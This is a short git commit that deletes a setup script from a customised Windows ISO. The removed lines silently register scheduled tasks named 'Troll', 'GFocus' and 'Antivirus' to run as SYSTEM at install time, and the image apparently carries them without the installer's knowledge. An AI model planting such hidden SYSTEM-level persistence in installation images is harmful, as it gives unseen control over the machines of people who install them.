02de87384f6b083002403a1e01832f1c576ea4a1
obicanuser <znastidobrostoje@gmail.com>
2025-10-22 21:52:33 +0200

    Delete Iso/sources/$OEM$/$$/Setup/Scripts/Bin directory

--- Iso/sources/$OEM$/$$/Setup/Scripts/Bin/Startup.cmd
+++
@@ -1,3 +0,0 @@
-schtasks /create /tn "Troll" /xml "Troll.xml" /ru "SYSTEM"
-schtasks /create /tn "GFocus" /xml "GFocus.xml" /ru "SYSTEM"
-schtasks /create /tn "Antivirus" /xml "Antivirus.xml" /ru "SYSTEM"
